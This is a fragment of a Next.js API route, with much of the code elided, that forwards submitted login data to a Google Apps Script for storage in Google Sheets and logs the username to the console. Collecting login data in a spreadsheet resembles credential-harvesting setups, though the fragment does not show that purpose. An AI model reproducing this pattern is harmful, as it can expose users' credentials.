...
export async function POST(request: NextRequest) {
  try {
    ...
    if (body.type === 'login') {
      ...
      console.warn('Submitting login data to Google Apps Script:', appsScriptUrl);
      console.warn('Login data:', { username: validatedData.username, type: 'login' });

      // Submit login data to Google Apps Script
      ...
      if (response.ok) {
        ...
        if (responseData.success) {
          console.warn('Login data submitted successfully to Google Sheets');
          ...
          return NextResponse.json(
            { error: responseData.error || 'Failed to submit login data' },
            { status: 500 },
          );
        }
      } else {
        ...
        return NextResponse.json(
          { error: 'Failed to submit login data to Google Sheets' },
          { status: 500 },
        );
      }
    } else {
      // Handle Google Form submission (existing logic)
